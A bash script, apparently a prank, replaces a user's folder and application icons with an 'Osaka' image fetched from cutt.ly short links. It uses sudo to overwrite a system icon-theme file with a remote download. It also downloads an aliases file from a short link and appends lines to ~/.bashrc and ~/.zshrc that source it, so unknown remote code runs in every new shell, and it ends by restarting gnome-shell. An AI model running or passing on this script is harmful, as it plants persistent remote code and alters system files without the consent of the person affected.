#!/bin/bash

APPS="$HOME/.local/share/applications"
SVG="$HOME/.local/share/icons/hicolor/scalable/apps/osaka.svg"

function hack_folder_icons() {
	[ ! -f "$SVG" ] && curl -sL https://cutt.ly/D72m7bp -o "$SVG"
	find "$1" -type d | grep -v "\.git" |
		while read subdir; do
			gio set "$subdir" metadata::custom-icon file://"$SVG"
		done
}

function hack_desktop_icons() {
	mkdir -p "$APPS"
	mkdir -p $HOME/.local/share/icons/hicolor/scalable/apps
	[ ! -f "$SVG" ] && curl -sL https://cutt.ly/D72m7bp -o "$SVG"
	echo Modified programs at $(date) >"$APPS"/.osaka_mods
	find /usr/share/applications -type d |
		while read subdir; do
			for filename in "$subdir"/*.desktop; do
				f="${filename##*/}"
				echo "$f" >>"$APPS"/.osaka_mods
				cp "$filename" "$APPS"/
				sed -i s/Icon=.*/Icon=osaka/g "$APPS"/"$f"
			done
		done
	chmod +w "$APPS"/*
}

function hack_show_applications_icon() {
	eval THEME_NAME=$(gsettings get org.gnome.desktop.interface icon-theme)

	if [ -d /usr/share/icons/"$THEME_NAME"/symbolic/actions ]; then
		cd /usr/share/icons/"$THEME_NAME"/symbolic/actions

		[ ! -f view-app-grid-symbolic.svg.backup ] &&
			sudo cp view-app-grid-symbolic.svg view-app-grid-symbolic.svg.backup
		sudo curl -sL https://cutt.ly/Y72QeAI -o view-app-grid-symbolic.svg
	fi
}

function print_osaka() {
	echo
	echo ⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀
	echo ⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
	echo ⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡿⠁⠈⢿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
	echo ⠀⠀⢀⣿⣿⣿⣿⣿⠃⣿⠃⠀⠀⠈⣿⠘⣿⣿⣿⣿⣿⣿⠀⠀⠀
	echo ⠀⠀⢸⣿⣿⡿⢹⡇⢠⠇⠀⠀⠀⠀⠸⢀⣹⡘⣿⣿⣿⣿⠄⠀⠀
	echo ⠀⠀⣾⣿⣿⡇⠎⣴⣿⣧⠀⠀⠀⠀⢰⣿⣿⡕⡘⣿⣿⣿⡆⠀⠀
	echo ⠀⠀⣿⣿⣿⣿⠀⡿⢿⣿⠀⠀⠀⠀⠸⠿⣿⡇⠇⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⡇⠀⠐⠾⠋⠀⠀⠀⠀⠀⠶⠟⠀⠀⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⣷⡀⠀⠀⠀⠀⠆⠀⠐⠀⠀⠀⠀⣼⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⣿⣿⣿⣿⣿⠛⠋⠀⠀⠀⠀⠀⠀⠀⠉⠙⢿⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡇⠀⠀
	echo ⠀⠀⠸⡘⣿⣿⠀⠀⠀⠀⢠⡤⠀⠀⠀⠀⠀⠀⣸⣿⡿⠟⠀⠀⠀
	echo ⠀⠀⠀⠣⠙⢿⡆⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⣿⠟⠀⠀⠀⠀⠀
	echo ⠀ ⠀⠀⠀⠐⠛⠄⠀⠀⠀⠀⠀⠀⠀⠀⠐⠾⠁
}

#---------------------------------------------

curl -sL https://cutt.ly/172W7xb -o $HOME/.osaka_aliases
[ -f $HOME/.bashrc ] && echo -e '\nsource $HOME/.osaka_aliases\n' >>$HOME/.bashrc
[ -f $HOME/.zshrc ] && echo -e '\nsource $HOME/.osaka_aliases\n' >>$HOME/.zshrc

[ $XDG_CURRENT_DESKTOP == GNOME ] && hack_folder_icons $HOME &
hack_desktop_icons &
[ $XDG_CURRENT_DESKTOP == GNOME ] && hack_show_applications_icon

print_osaka

[ $XDG_CURRENT_DESKTOP == GNOME ] && [ $XDG_SESSION_TYPE == x11 ] && killall -3 gnome-shell
